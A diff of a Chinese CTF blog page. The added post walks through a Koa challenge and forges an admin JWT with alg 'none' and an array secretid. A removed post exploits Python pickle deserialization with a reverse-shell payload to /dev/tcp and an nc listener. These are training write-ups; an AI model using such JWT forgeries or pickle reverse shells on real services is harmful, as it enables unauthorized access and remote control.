@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,95 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-koa框架以及JWT利用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/28/koa%E6%A1%86%E6%9E%B6%E4%BB%A5%E5%8F%8AJWT%E5%88%A9%E7%94%A8/" class="article-date">
+  	<time datetime="2021-09-27T16:00:00.000Z" itemprop="datePublished">2021-09-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/28/koa%E6%A1%86%E6%9E%B6%E4%BB%A5%E5%8F%8AJWT%E5%88%A9%E7%94%A8/">
+        koa框架以及JWT利用
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="koa框架以及JWT利用"><a href="#koa框架以及JWT利用" class="headerlink" title="koa框架以及JWT利用"></a>koa框架以及JWT利用</h1><p>打开页面，发现是登录界面，尝试sql注入闭合测试，发现没有sql注入，所以打开源码，发现一个关键点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/static/js/app.js&quot;</span><br></pre></td></tr></table></figure>
+<p>所以打开app.js源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *  或许该用 koa-static 来处理静态文件</span><br><span class="line"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">function login() &#123;</span><br><span class="line">    const username = $(&quot;#username&quot;).val();</span><br><span class="line">    const password = $(&quot;#password&quot;).val();</span><br><span class="line">    const token = sessionStorage.getItem(&quot;token&quot;);</span><br><span class="line">    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)</span><br><span class="line">        .done(function(data) &#123;</span><br><span class="line">            const &#123;status&#125; = data;</span><br><span class="line">            if(status) &#123;</span><br><span class="line">                document.location = &quot;/home&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function register() &#123;</span><br><span class="line">    const username = $(&quot;#username&quot;).val();</span><br><span class="line">    const password = $(&quot;#password&quot;).val();</span><br><span class="line">    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)</span><br><span class="line">        .done(function(data) &#123;</span><br><span class="line">            const &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(&#x27;token&#x27;, token);</span><br><span class="line">            document.location = &quot;/login&quot;;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function logout() &#123;</span><br><span class="line">    $.get(&#x27;/api/logout&#x27;).done(function(data) &#123;</span><br><span class="line">        const &#123;status&#125; = data;</span><br><span class="line">        if(status) &#123;</span><br><span class="line">            document.location = &#x27;/login&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getflag() &#123;</span><br><span class="line">    $.get(&#x27;/api/flag&#x27;).done(function(data) &#123;</span><br><span class="line">        const &#123;flag&#125; = data;</span><br><span class="line">        $(&quot;#username&quot;).val(flag);</span><br><span class="line">    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">koa-static</span><br></pre></td></tr></table></figure>
+<p>可知是koa框架，所以我们可以看一下koa框架的构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">controllers目录下的api.js----------------------------------REST API</span><br><span class="line"></span><br><span class="line">model目录下的products.js--------------------------------具体的model</span><br><span class="line"></span><br><span class="line">node_modules目录下的app.js----------------------------使用koa的js</span><br><span class="line"></span><br><span class="line">node_modules目录下的controller.js---------------------扫描注册的controller</span><br><span class="line"></span><br><span class="line">node_modules目录下的package.json--------------------项目描叙文件</span><br><span class="line"></span><br><span class="line">node_modules目录下的rest.js----------------------------REST的middleware</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/controllers/api.js</span><br></pre></td></tr></table></figure>
+<p>得到主要逻辑代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>从源码中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">       if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">           throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>可知，token值中的username=admin，才可以得到权限，而在注册界面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br></pre></td></tr></table></figure>
+<p>在注册时，生成一个token值作为登录的验证，而nodejs的jwt存在缺陷</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br></pre></td></tr></table></figure>
+<p>就是在secret为空时，会没有签名认证，但是api.js代码中，设有secret的验证，不可以为空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>但是js和php一样，是弱语言类型，所以我们只要设置secretid为小数或空数组，则可以绕过，而在登录界面post提交的username和password与token中的username和password的值必须是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">       if(status) &#123;</span><br><span class="line">           ctx.session.username = username;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用<a target="_blank" rel="noopener" href="https://jwt.io网站来显示token值中header和payload中的结构/">https://jwt.io网站来显示token值中HEADER和PAYLOAD中的结构</a><br>HEADER</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PAYLOAD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;secretid&quot;: 0,</span><br><span class="line">  &quot;username&quot;: &quot;xc&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;123&quot;,</span><br><span class="line">  &quot;iat&quot;: 1632839777</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以post提交username=admin&amp;password=123，然后改token中的alg的值为none，username的值为admin，所以exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  &quot;secretid&quot;: [],</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;123&quot;,</span><br><span class="line">  &quot;iat&quot;: 1632811865</span><br><span class="line">&#125;,</span><br><span class="line">algorithm=&quot;none&quot;,key=&quot;&quot;</span><br><span class="line">).encode(&#x27;utf=8&#x27;).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后提交，点击GET FLAG并抓包提交即可看见flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A1%86%E6%9E%B6/" rel="tag">框架</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-pop链以及phar协议" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1157,85 +1246,6 @@ echo serialize($obj);
 <p>将不可见字符的ascii码化为16进制，并在前面加%即可使用，所以我们可以构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure>
 <p>就可以读取config.php文件</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-python反序列化以及反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/19/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BC%B9shell/" class="article-date">
-  	<time datetime="2021-09-18T16:00:00.000Z" itemprop="datePublished">2021-09-19</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/19/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BC%B9shell/">
-        python反序列化以及反弹shell
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="python反序列化以及反弹shell（长城杯ez-python）"><a href="#python反序列化以及反弹shell（长城杯ez-python）" class="headerlink" title="python反序列化以及反弹shell（长城杯ez_python）"></a>python反序列化以及反弹shell（长城杯ez_python）</h1><p>首先我们打开页面，发现一张图片，然后构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pic=/app/app.py</span><br></pre></td></tr></table></figure>
-<p>读取源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line">from flask import render_template,redirect,send_from_directory</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">from flask import send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">class User():</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">def check(s):</span><br><span class="line">    if b&#x27;R&#x27; in s:</span><br><span class="line">        return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    try:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        if check(user):</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            username = user[&quot;username&quot;]</span><br><span class="line">        else:</span><br><span class="line">            username = &quot;bad,bad,hacker&quot;</span><br><span class="line">    except:</span><br><span class="line">        username = &quot;CTFer&quot;</span><br><span class="line">    pic = &#x27;&#123;0&#125;.jpg&#x27;.format(random.randint(1,7))</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        pic=request.args.get(&#x27;pic&#x27;)</span><br><span class="line">        with open(pic, &#x27;rb&#x27;) as f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line">    except:</span><br><span class="line">        pic=&#x27;&#123;0&#125;.jpg&#x27;.format(random.randint(1,7))</span><br><span class="line">        with open(pic, &#x27;rb&#x27;) as f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line"></span><br><span class="line">    return render_template(&#x27;index.html&#x27;, uname=username, pic=p )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;,port=8888)</span><br></pre></td></tr></table></figure>
-
-<p>在源码中看到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        if check(user):</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            username = user[&quot;username&quot;]</span><br><span class="line"></span><br><span class="line">return render_template(&#x27;index.html&#x27;, uname=username, pic=p )</span><br></pre></td></tr></table></figure>
-<p>可知我们可以使用user这个利用点，来进行python反序列化，从而执行我们输入的命令，但是我们不知道flag在哪个文件中，所以我们可以使用反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>所以我们可以写一个exp对反弹shell的命令进行python序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">a = b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">a = pickletools.optimize(a)</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></table></figure>
-
-<p>其中ip是写公网ip，port端口自己定义，公网ip可以自己租一个服务器来接受反弹的shell</p>
-<p>然后抓包，并在cookie中加入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=上面脚本生成的base64编码的数</span><br></pre></td></tr></table></figure>
-<p>然后在服务器中的命令行中输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 端口</span><br></pre></td></tr></table></figure>
-<p>来监测我们反弹shell的端口，然后放包，我们可以获得shell，执行ls命令，发现flag在flagggggggggggggaaa文件中，所以我们再执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flagggggggggggggaaa</span><br></pre></td></tr></table></figure>
-<p>即可获得flag</p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/119571814">https://blog.csdn.net/HBohan/article/details/119571814</a></p>
 
       
     </div>
